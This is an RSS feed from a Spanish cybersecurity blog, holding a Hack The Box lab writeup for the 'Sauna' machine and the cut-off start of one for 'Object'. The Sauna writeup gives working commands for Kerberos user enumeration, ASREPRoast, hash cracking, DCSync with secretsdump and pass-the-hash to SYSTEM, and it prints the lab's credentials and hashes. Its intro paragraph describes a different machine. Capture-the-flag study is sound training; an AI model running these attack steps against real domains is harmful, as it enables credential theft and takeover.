<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Firtsmiracle blog de Ciberseguridad</title>
    <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Thu, 23 Nov 2023 22:16:57 -0500</pubDate>
    <lastBuildDate>Thu, 23 Nov 2023 22:16:57 -0500</lastBuildDate>
    <generator>Jekyll v4.3.2</generator>
    
      <item>
        <title>Maquina Sauna - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Sauna&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad &lt;code&gt;facil&lt;/code&gt;, esta vez nos enfrentamos a un &lt;code&gt;jenkyll&lt;/code&gt; el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del &lt;code&gt;jenkins&lt;/code&gt; para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con &lt;code&gt;bloodhound&lt;/code&gt;, abusaremos del permiso de &lt;code&gt;ForceChangedPassword&lt;/code&gt; para cambiar la contraseña de un usuario y una vez como este aprovecharnos de &lt;code&gt;GenericWrite&lt;/code&gt; para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio &lt;code&gt;WriteOwner&lt;/code&gt; asigarnos el privilegio de &lt;code&gt;DomainAdmins&lt;/code&gt; y asi obtener acceso completo al sistema.&lt;/p&gt;

&lt;p&gt;Maquina bastante interesante.&lt;/p&gt;

&lt;p&gt;Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Sauna
❯ ls

 Sauna
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.175
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=116 ms

--- 10.10.10.175 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 116.468/116.468/116.468/0.000 ms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.175 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 19:04 -05
Initiating SYN Stealth Scan at 19:04
Scanning 10.10.10.175 [65535 ports]
Discovered open port 445/tcp on 10.10.10.175
Discovered open port 135/tcp on 10.10.10.175
Discovered open port 53/tcp on 10.10.10.175
Discovered open port 139/tcp on 10.10.10.175
Discovered open port 80/tcp on 10.10.10.175
Discovered open port 464/tcp on 10.10.10.175
Discovered open port 636/tcp on 10.10.10.175
Discovered open port 49667/tcp on 10.10.10.175
Discovered open port 389/tcp on 10.10.10.175
Discovered open port 9389/tcp on 10.10.10.175
Discovered open port 88/tcp on 10.10.10.175
Discovered open port 49673/tcp on 10.10.10.175
Discovered open port 593/tcp on 10.10.10.175
Discovered open port 49674/tcp on 10.10.10.175
Discovered open port 3268/tcp on 10.10.10.175
Discovered open port 5985/tcp on 10.10.10.175
Discovered open port 49676/tcp on 10.10.10.175
Discovered open port 3269/tcp on 10.10.10.175
Discovered open port 49698/tcp on 10.10.10.175
Completed SYN Stealth Scan at 19:04, 26.71s elapsed (65535 total ports)
Nmap scan report for 10.10.10.175
Host is up, received user-set (0.14s latency).
Scanned at 2023-11-23 19:04:29 -05 for 27s
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
           Raw packets sent: 131064 (5.767MB) | Rcvd: 32 (1.408KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49698 10.10.10.175 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 19:05 -05
Nmap scan report for 10.10.10.175
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-24 07:05:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-24T07:06:39
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.74 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entre los puertos abiertos mas relevantes podemos visualizar:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;DNS&lt;/td&gt;
      &lt;td&gt;Simple DNS Plus&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Microsoft IIS httpd 10.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;88&lt;/td&gt;
      &lt;td&gt;KERBEROS&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Kerberos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;389&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3268&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows Active Directory LDAP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como vemos que el puerto &lt;code&gt;80&lt;/code&gt; corresponde a un servicio web con &lt;code&gt;whatweb&lt;/code&gt; vamos a tratar de enumerar las tecnolologias que emplean.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.175
http://10.10.10.175 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que nos enfrentamos a un &lt;code&gt;IIS&lt;/code&gt;, y concretamente en la seccion de &lt;code&gt;about&lt;/code&gt;, podemos ver varios nombres potecialmente a ser usuarios validos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sauna1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a almacenar los usuarios en un archivo, y como es comun lo haremos bajo la primera inicial del nombre y el apellido, como se muestran a continuación.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora vamos a usar &lt;code&gt;crackmapexec&lt;/code&gt; para realizar una enumeración por &lt;code&gt;smb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.175
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y agregaremos el dominio al &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.172 EGOTISTICAL-BANK.LOCAL&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora si con &lt;code&gt;kerbrute&lt;/code&gt; enumeramos los usuarios validos, la herramienta nos muestra que &lt;code&gt;Fsmith&lt;/code&gt; es valido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /opt/kerbrute/kerbrute userenum users --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/23/23 - Ronnie Flathers @ropnop

2023/11/23 19:21:18 &amp;gt;  Using KDC(s):
2023/11/23 19:21:18 &amp;gt;  	10.10.10.175:88
2023/11/23 19:21:18 &amp;gt;  [+] VALID USERNAME:	Fsmith@EGOTISTICAL-BANK.LOCAL
2023/11/23 19:21:18 &amp;gt;  Done! Tested 6 usernames (1 valid) in 0.310 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a usar &lt;code&gt;GetNPUsers&lt;/code&gt; para ejecutar un &lt;code&gt;ASRepRoast&lt;/code&gt; y obtener un &lt;code&gt;TGT&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile uservalid
Impacket v0.11.0 - Copyright 2023 Fortra

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:34df8e0e65cf634b68d04ae2df6e86d9$831b6eae128953abd71def69f04090582868598f156a6c40de789274d7702adc542d91857ee30ab39d7d280def70a6cc8cbda911a7ab0603e307166770bff2c7f9751b64df908cc27cabc6536f1f5b3e539c9fbc8529ec457308ed1798b9dc3bb86f839d23d0260138e386fb9d8335a7d98652329cb623899c16d1b744846337529b4057017b66ccd9b65035ab8cb619c5e89b0facf8334b75944a40b79c7a7a16c457c639d0801fa2855108b70e896efdf1613c1704583030181459258fedb2ff266fc0700ddded76d05759a8b278539cfb125d39b10e33815e49506ce8f724e6e5473c7e45966ec75bdb0c0d7a78b42a710f387324d32b689a9314c4a1f596
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y ahora procedemos a crackear el hash con &lt;code&gt;john&lt;/code&gt; y obtenemos unas credenciales &lt;code&gt;jsmith:Thestrokes23&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:06 DONE (2023-11-23 19:39) 0.1477g/s 1556Kp/s 1556Kc/s 1556KC/s Tiffani1432..Thanongsuk_police
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos con &lt;code&gt;evil-winrm&lt;/code&gt; como el usuario &lt;code&gt;fsmith&lt;/code&gt; y procedemos a leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sa1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Usaremos &lt;code&gt;ldapdomaindump&lt;/code&gt; para enumerar los usuarios y saber los grupos a los cuales pertenecen.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 /opt/ldapdomaindump/ldapdomaindump -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' 10.10.10.175
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
❯ ls
 domain_computers.grep   domain_computers_by_os.html   domain_groups.json   domain_policy.json   domain_trusts.json   domain_users.json            users
 domain_computers.html   domain_groups.grep            domain_policy.grep   domain_trusts.grep   domain_users.grep    domain_users_by_group.html   uservalid
 domain_computers.json   domain_groups.html            domain_policy.html   domain_trusts.html   domain_users.html    hash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SI ahora visualizamos vemos en nuestro navegador los grupos pertenecientes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sauna2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver que ademas de &lt;code&gt;fsmith&lt;/code&gt;, el usuario &lt;code&gt;svc_loanmgr&lt;/code&gt; tambien es parte del grupo &lt;code&gt;Remote Management Users&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora para enumerar el sistema ya que estamos como el usuario &lt;code&gt;fsmith&lt;/code&gt; vamos a usar ha herramienta &lt;code&gt;winpeas.exe&lt;/code&gt;, la cual podemos obtener del repositorio de &lt;code&gt;GitHub&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/releases&quot;&gt;Winpeas.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Users\FSmith\Documents&amp;gt; upload /home/fmiracle/machines/Sauna/content/winPEASany.exe
                                        
Info: Uploading /home/fmiracle/machines/Sauna/content/winPEASany.exe to C:\Users\FSmith\Documents\winPEASany.exe
                                        
Data: 3183956 bytes of 3183956 bytes copied
                                        
Info: Upload successful!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Despues de ejecutar obtenemos las credenciales del usuario &lt;code&gt;svc_loanmanager&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sauna3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora podemos conectarnos como el usuario &lt;code&gt;svc_loanmanager&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; whoami
egotisticalbank\svc_loanmgr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para enumerar el sistema ahora como el usuario actual usaremos &lt;code&gt;sharphound.ps1&lt;/code&gt;, para ello podemos descargarlo del repositorio en el siguiente enlance:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1&quot;&gt;Sharphound.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Subimos el script a la maquina victima, importamos y ejecutamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\privesc&amp;gt; upload /home/fmiracle/machines/Sauna/content/SharpHound.ps1
                                        
Info: Uploading /home/fmiracle/machines/Sauna/content/SharpHound.ps1 to C:\Windows\Temp\privesc\SharpHound.ps1
                                        
Data: 1744464 bytes of 1744464 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp\privesc&amp;gt; Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Windows\Temp\privesc&amp;gt; Invoke-BloodHound -CollectionMethods All
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y traemos el comprimido que nos crea a nuestra maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\wINDOWS\tEMP\Privesc&amp;gt; download C:\wINDOWS\tEMP\Privesc\20231124015657_BloodHound.zip
                                        
Info: Downloading C:\wINDOWS\tEMP\Privesc\20231124015657_BloodHound.zip to 20231124015657_BloodHound.zip
                                        
Info: Download successful!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Subimos el comprimido al &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sauna4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora marcamos al usuario &lt;code&gt;svc_loanmgr&lt;/code&gt; como &lt;code&gt;owned&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sauna5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el usuario tiene privilegios &lt;code&gt;GetChangesAll&lt;/code&gt; sobre el dominio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sauna6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora vemos que podemos hacer con este privilegio, &lt;code&gt;bloodhound&lt;/code&gt; nos indica que podemos efectuar en &lt;code&gt;DCSync Attack&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sauna6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para ello podemos usar &lt;code&gt;secretsdump&lt;/code&gt; para poder dumpearnos todos los hashes, incluido el del usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sauna/sa2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seguidamente podemos aplicar un &lt;code&gt;pass the hash&lt;/code&gt; con &lt;code&gt;psexec&lt;/code&gt; y conectarnos como el usuario administrator.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes :823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file JfTdhTjz.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service mLSo on 10.10.10.175.....
[*] Starting service mLSo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&amp;gt; whoami
nt authority\system
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;FInalmente nos dirigimos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y podemos visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Windows\system32&amp;gt; cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop&amp;gt; type root.txt
3663f10ee0496eaccec1c7a21f3f8faf
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 23 Nov 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Sauna</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Sauna</guid>
        
        <category>Active Directory</category>
        
        <category>Information Leakage</category>
        
        <category>Kerberos User Enumeration</category>
        
        <category>Kerbrute ASRepRoast Attack (GetNPUsers)</category>
        
        <category>Cracking Hashes</category>
        
        <category>System Enumeration</category>
        
        <category>WinPEAS AutoLogon</category>
        
        <category>BloodHound</category>
        
        <category>DCSync Attack</category>
        
        <category>Secretsdump</category>
        
        <category>PassTheHash</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Object - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Oject&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad &lt;code&gt;dificil&lt;/code&gt;, esta vez nos enfrentamos a un &lt;code&gt;jenkyll&lt;/code&gt; el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del &lt;code&gt;jenkins&lt;/code&gt; para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con &lt;code&gt;bloodhound&lt;/code&gt;, abusaremos del permiso de &lt;code&gt;ForceChangedPassword&lt;/code&gt; para cambiar la contraseña de un usuario y una vez como este aprovecharnos de &lt;code&gt;GenericWrite&lt;/code&gt; para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio &lt;code&gt;WriteOwner&lt;/code&gt; asigarnos el privilegio de &lt;code&gt;DomainAdmins&lt;/code&gt; y asi obtener acceso completo al sistema.&lt;/p&gt;

&lt;p&gt;Maquina bastante interesante.&lt;/p&gt;

&lt;p&gt;Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Object
❯ ls

 Object
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.11.132
